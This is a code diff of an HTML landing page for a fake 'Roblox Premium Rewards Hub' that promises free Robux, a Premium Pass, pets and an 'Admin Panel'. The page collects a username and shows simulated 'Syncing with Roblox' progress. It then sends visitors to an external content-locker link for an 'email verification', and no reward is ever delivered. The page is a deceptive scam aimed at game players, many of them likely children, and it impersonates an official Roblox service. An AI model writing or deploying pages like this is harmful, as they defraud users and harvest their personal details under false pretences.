@@ -3,97 +3,133 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Roblox Reward Central | Official 2026</title>
+    <title>Roblox Premium Rewards Hub</title>
     <script src="https://cdn.tailwindcss.com"></script>
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/4.1.1/animate.min.css" rel="stylesheet">
     <style>
-        body { background-color: #0f172a; color: white; font-family: 'Inter', sans-serif; overflow-x: hidden; }
-        .roblox-card { background: rgba(30, 41, 59, 0.7); backdrop-filter: blur(10px); border: 1px solid rgba(255,255,255,0.1); }
-        .progress-bar { transition: width 0.5s ease-in-out; }
-        @keyframes pulse { 0%, 100% { opacity: 1; } 50% { opacity: 0.5; } }
-        .status-dot { animation: pulse 1s infinite; }
+        body { background: radial-gradient(circle at center, #1e293b, #0f172a); color: white; font-family: 'Poppins', sans-serif; overflow-x: hidden; }
+        .reward-card { border: 2px solid transparent; transition: all 0.3s; cursor: pointer; background: rgba(255,255,255,0.05); }
+        .reward-card:hover { transform: translateY(-5px); background: rgba(255,255,255,0.1); border-color: #3b82f6; }
+        .selected { border-color: #ef4444 !important; background: rgba(239, 68, 68, 0.15) !important; box-shadow: 0 0 20px rgba(239, 68, 68, 0.4); }
+        .btn-gradient { background: linear-gradient(90deg, #ef4444, #3b82f6); background-size: 200% 200%; animation: gradientMove 3s infinite; }
+        @keyframes gradientMove { 0% {background-position: 0% 50%;} 50% {background-position: 100% 50%;} 100% {background-position: 0% 50%;} }
     </style>
 </head>
 <body class="flex flex-col items-center justify-center min-h-screen p-4">
 
-    <div class="mb-6 flex items-center space-x-2">
-        <div class="w-10 h-10 bg-red-600 rounded-lg flex items-center justify-center font-black text-2xl shadow-lg shadow-red-500/20">R</div>
-        <h1 class="text-2xl font-black tracking-tight">ROBLOX <span class="text-slate-400 font-light text-sm uppercase">Rewards</span></h1>
+    <div class="text-center mb-8 animate__animated animate__fadeInDown">
+        <div class="inline-block bg-red-600 p-3 rounded-2xl shadow-2xl mb-4">
+            <svg class="w-10 h-10 text-white" fill="currentColor" viewBox="0 0 24 24"><path d="M18.5 18.5h-13v-13h13v13zM5 3a2 2 0 00-2 2v14a2 2 0 002 2h14a2 2 0 002-2V5a2 2 0 00-2-2H5z"/></svg>
+        </div>
+        <h1 class="text-4xl font-black italic tracking-tighter">ROBLOX <span class="text-blue-500">HUB</span></h1>
+        <p class="text-slate-400 font-bold text-xs uppercase tracking-widest mt-1">Authorized Reward Distribution 2026</p>
     </div>
 
-    <div class="max-w-md w-full roblox-card rounded-3xl p-8 shadow-2xl relative">
+    <div class="max-w-lg w-full bg-slate-900/80 backdrop-blur-xl border border-slate-700 rounded-[2.5rem] p-8 shadow-2xl">
         
-        <div id="step-1">
-            <h2 class="text-xl font-bold mb-2">Account Connection</h2>
-            <p class="text-slate-400 text-sm mb-6">Enter your Roblox username to search for available rewards on your account.</p>
-            
-            <div class="relative mb-6">
-                <input type="text" id="username" placeholder="Roblox Username..." 
-                       class="w-full bg-slate-800 border border-slate-700 rounded-xl py-4 px-5 text-white focus:outline-none focus:border-red-500 transition-all">
-                <div class="absolute right-4 top-4 text-green-500 status-dot">●</div>
-            </div>
-
-            <button onclick="startConnecting()" id="connect-btn"
-                    class="w-full bg-red-600 hover:bg-red-500 text-white font-bold py-4 rounded-xl shadow-lg shadow-red-600/30 transition-all active:scale-95">
-                Connect Account
+        <div id="step-1" class="animate__animated animate__fadeIn">
+            <h2 class="text-2xl font-bold mb-4 flex items-center"><span class="bg-blue-500 w-8 h-8 rounded-full flex items-center justify-center text-sm mr-3">1</span> Link Account</h2>
+            <input type="text" id="username" placeholder="Enter Roblox Username..." 
+                   class="w-full bg-slate-800/50 border-2 border-slate-700 rounded-2xl py-4 px-6 text-xl focus:outline-none focus:border-blue-500 transition-all mb-6">
+            <button onclick="goToStep2()" class="w-full btn-gradient text-white font-black py-5 rounded-2xl text-xl uppercase italic shadow-lg">
+                Continue
             </button>
         </div>
 
-        <div id="step-2" class="hidden text-center py-10">
-            <div class="inline-block w-16 h-16 border-4 border-slate-700 border-t-red-500 rounded-full animate-spin mb-4"></div>
-            <p id="loading-text" class="text-lg font-medium">Searching database...</p>
-            <p id="username-display" class="text-slate-400 text-sm mt-2 italic font-bold text-red-400"></p>
+        <div id="step-2" class="hidden animate__animated animate__fadeIn">
+            <h2 class="text-2xl font-bold mb-4 flex items-center"><span class="bg-blue-500 w-8 h-8 rounded-full flex items-center justify-center text-sm mr-3">2</span> Choose Reward</h2>
+            <div class="grid grid-cols-2 gap-4 mb-6">
+                <div class="reward-card p-4 rounded-2xl text-center" onclick="selectReward(this, '10,000 Robux')">
+                    <div class="text-3xl mb-2">💰</div>
+                    <div class="font-bold text-sm">10,000 Robux</div>
+                    <div class="text-[10px] text-green-400">Available</div>
+                </div>
+                <div class="reward-card p-4 rounded-2xl text-center" onclick="selectReward(this, 'Premium Pass')">
+                    <div class="text-3xl mb-2">💎</div>
+                    <div class="font-bold text-sm">Premium Pass</div>
+                    <div class="text-[10px] text-green-400">Available</div>
+                </div>
+                <div class="reward-card p-4 rounded-2xl text-center" onclick="selectReward(this, 'Exclusive Pet')">
+                    <div class="text-3xl mb-2">🐲</div>
+                    <div class="font-bold text-sm">Exclusive Pet</div>
+                    <div class="text-[10px] text-green-400">Available</div>
+                </div>
+                <div class="reward-card p-4 rounded-2xl text-center" onclick="selectReward(this, 'Admin Panel')">
+                    <div class="text-3xl mb-2">🛠️</div>
+                    <div class="font-bold text-sm">Admin Panel</div>
+                    <div class="text-[10px] text-red-400">Limited</div>
+                </div>
+            </div>
+            <button onclick="goToStep3()" class="w-full btn-gradient text-white font-black py-5 rounded-2xl text-xl uppercase italic shadow-lg">
+                Confirm Selection
+            </button>
         </div>
 
-        <div id="step-3" class="hidden">
-            <div class="bg-green-500/10 border border-green-500/50 rounded-2xl p-4 mb-6 text-center">
-                <p class="text-green-400 font-bold">✓ Account Verified</p>
+        <div id="step-3" class="hidden text-center py-10 animate__animated animate__zoomIn">
+            <div class="relative inline-block">
+                <div class="w-20 h-20 border-4 border-blue-500/20 border-t-blue-500 rounded-full animate-spin"></div>
+                <div class="absolute inset-0 flex items-center justify-center text-xs font-bold text-blue-400" id="percent">0%</div>
             </div>
-            
-            <h2 class="text-xl font-bold mb-2">Claim Your Reward</h2>
-            <p class="text-slate-400 text-sm mb-6">To prevent bot spam, please complete a quick verification by submitting your email on the next page.</p>
-            
-            <div class="bg-slate-800 p-4 rounded-xl mb-6 flex items-center justify-between">
-                <div class="flex items-center space-x-3">
-                    <div class="w-10 h-10 bg-yellow-500/20 rounded flex items-center justify-center text-yellow-500">💰</div>
-                    <span class="font-bold">1,000 Robux Card</span>
+            <p id="loader-msg" class="text-lg font-bold mt-6 text-blue-400 uppercase tracking-tighter">Syncing with Roblox...</p>
+        </div>
+
+        <div id="step-4" class="hidden animate__animated animate__bounceIn">
+            <div class="text-center mb-6">
+                <div class="bg-green-500 w-16 h-16 rounded-full flex items-center justify-center mx-auto mb-4 shadow-lg shadow-green-500/30">
+                    <svg class="w-8 h-8 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="3" d="M5 13l4 4L19 7"></path></svg>
                 </div>
-                <span class="text-xs text-slate-500 uppercase">Pending...</span>
+                <h2 class="text-2xl font-black uppercase">Package Ready!</h2>
+                <p class="text-slate-400 text-sm">Selected: <span id="final-reward" class="text-white font-bold"></span></p>
             </div>
+            
+            <p class="text-xs text-center text-slate-500 mb-6 bg-slate-800 p-3 rounded-lg border border-slate-700">
+                To finalize the delivery to <span id="final-user" class="text-blue-400"></span>, please complete the human verification (Email submission required).
+            </p>
 
             <a href="https://singingfiles.com/show.php?l=0&u=2499815&id=73209" 
-               class="block w-full bg-green-500 hover:bg-green-400 text-black text-center font-black py-4 rounded-xl shadow-lg shadow-green-500/30 transition-all text-lg uppercase tracking-wider">
-                Claim Reward Now
+               class="block w-full bg-green-500 hover:bg-green-400 text-black text-center font-black py-5 rounded-2xl text-2xl uppercase italic shadow-xl transition-all">
+                Claim Now
             </a>
         </div>
-
-    </div>
-
-    <div class="mt-8 opacity-30 flex space-x-6 grayscale invert">
-        <img src="https://upload.wikimedia.org/wikipedia/commons/b/b2/Ssl-logo.png" class="h-6">
-        <img src="https://upload.wikimedia.org/wikipedia/commons/e/e2/Safe_Harbor_Shield.svg" class="h-6">
     </div>
 
     <script>
-        function startConnecting() {
-            let user = document.getElementById('username').value;
-            if (user.length < 3) { 
-                alert("Please enter a valid username"); 
-                return; 
-            }
+        let selectedRewardName = "";
+        
+        function selectReward(el, name) {
+            document.querySelectorAll('.reward-card').forEach(c => c.classList.remove('selected'));
+            el.classList.add('selected');
+            selectedRewardName = name;
+        }
 
+        function goToStep2() {
+            if(document.getElementById('username').value.length < 3) return alert("Enter Username");
             document.getElementById('step-1').classList.add('hidden');
             document.getElementById('step-2').classList.remove('hidden');
-            document.getElementById('username-display').innerText = "@" + user;
+        }
 
-            // Simulation d'étapes
-            setTimeout(() => { document.getElementById('loading-text').innerText = "Connecting to Roblox servers..."; }, 1500);
-            setTimeout(() => { document.getElementById('loading-text').innerText = "Analyzing account history..."; }, 3000);
-            setTimeout(() => { document.getElementById('loading-text').innerText = "Generating Reward Token..."; }, 4500);
+        function goToStep3() {
+            if(!selectedRewardName) return alert("Select a Reward");
+            document.getElementById('step-2').classList.add('hidden');
+            document.getElementById('step-3').classList.remove('hidden');
             
-            setTimeout(() => {
-                document.getElementById('step-2').classList.add('hidden');
-                document.getElementById('step-3').classList.remove('hidden');
-            }, 6000);
+            let p = 0;
+            let interval = setInterval(() => {
+                p += Math.floor(Math.random() * 5) + 1;
+                if(p > 100) p = 100;
+                document.getElementById('percent').innerText = p + "%";
+                if(p == 100) {
+                    clearInterval(interval);
+                    showFinal();
+                }
+            }, 100);
+        }
+
+        function showFinal() {
+            document.getElementById('step-3').classList.add('hidden');
+            document.getElementById('step-4').classList.remove('hidden');
+            document.getElementById('final-reward').innerText = selectedRewardName;
+            document.getElementById('final-user').innerText = "@" + document.getElementById('username').value;
         }
     </script>
 </body>
